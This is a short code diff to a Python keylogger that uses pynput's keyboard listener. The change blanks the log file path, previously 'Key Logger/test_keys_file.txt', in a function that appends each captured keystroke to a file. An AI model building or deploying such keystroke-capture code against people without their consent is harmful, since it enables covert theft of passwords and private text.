@@ -2,7 +2,7 @@ from pynput.keyboard import Listener, Key
 
 def on_press_function(caputed_key):
 
-    file_path = "Key Logger/test_keys_file.txt"
+    file_path = ""
 
     with open(file_path, "a") as logged_keys:
         logged_keys.write(f"{str(caputed_key)}\n")
